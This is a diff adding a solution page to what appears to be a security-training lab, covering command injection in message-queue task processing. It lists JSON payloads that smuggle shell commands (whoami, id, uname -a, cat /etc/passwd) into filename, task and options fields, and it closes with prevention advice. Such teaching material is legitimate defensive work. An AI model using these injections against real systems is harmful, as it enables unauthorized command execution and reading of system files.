@@ -1,0 +1,97 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: Command Injection in Message Queues - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">Solution: Command Injection in Message Queues</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="bi bi-info-circle-fill me-2"></i>
+                    <strong>Challenge:</strong> Exploit command injection vulnerabilities in a distributed message queue processing system.
+                </div>
+
+                <h3 class="mt-4">Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates command injection in a distributed task processing system that uses message queues. The system processes JSON messages containing task instructions but lacks proper input validation on worker nodes.
+                </p>
+
+                <h3 class="mt-4">Solution Steps</h3>
+                <ol>
+                    <li>
+                        <p><strong>Analyze message structure:</strong> Understand the JSON message format expected by the queue.</p>
+                    </li>
+                    <li>
+                        <p><strong>Inject commands in message values:</strong> Try injecting commands in JSON message fields.</p>
+                        <pre class="bg-light p-3 rounded"><code>{"task": "process_file", "filename": "data.csv; whoami", "options": "--format json"}</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Test different message fields:</strong> Try injection in various message parameters.</p>
+                        <pre class="bg-light p-3 rounded"><code>{"task": "process_file && id", "filename": "data.csv", "options": "--format json"}</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Exploit distributed processing:</strong> Leverage the distributed nature for wider impact.</p>
+                        <pre class="bg-light p-3 rounded"><code>{"task": "process_file", "filename": "data.csv", "options": "--format json; uname -a"}</code></pre>
+                    </li>
+                </ol>
+
+                <h3 class="mt-4">Message Queue Payloads</h3>
+                <ul>
+                    <li><code>{"task": "process_file", "filename": "data.csv; whoami", "options": "--format json"}</code></li>
+                    <li><code>{"task": "process_file && id", "filename": "data.csv", "options": "--format json"}</code></li>
+                    <li><code>{"task": "process_file", "filename": "data.csv", "options": "--format json; uname -a"}</code></li>
+                    <li><code>{"task": "process_file", "command": "cat /etc/passwd", "filename": "data.csv"}</code></li>
+                </ul>
+
+                <h3 class="mt-4">Distributed System Context</h3>
+                <p>Message queue vulnerabilities can affect:</p>
+                <ul>
+                    <li>Multiple worker nodes simultaneously</li>
+                    <li>Entire microservices architectures</li>
+                    <li>Data processing pipelines</li>
+                    <li>Event-driven systems</li>
+                </ul>
+
+                <h3 class="mt-4">Message Queue Systems</h3>
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>Popular Queues:</h6>
+                        <ul>
+                            <li>Apache Kafka</li>
+                            <li>RabbitMQ</li>
+                            <li>Amazon SQS</li>
+                            <li>Redis Pub/Sub</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Processing Frameworks:</h6>
+                        <ul>
+                            <li>Celery</li>
+                            <li>Apache Storm</li>
+                            <li>Apache Spark</li>
+                            <li>Kubernetes Jobs</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h3 class="mt-4">Prevention</h3>
+                <ol>
+                    <li><strong>Message Validation:</strong> Validate all message content before processing</li>
+                    <li><strong>Worker Isolation:</strong> Isolate worker node environments</li>
+                    <li><strong>Input Sanitization:</strong> Sanitize all message parameters</li>
+                    <li><strong>Least Privilege:</strong> Run workers with minimal privileges</li>
+                </ol>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('cmdi_level19') }}" class="btn btn-outline-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end"><i class="bi bi-list me-2"></i>All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
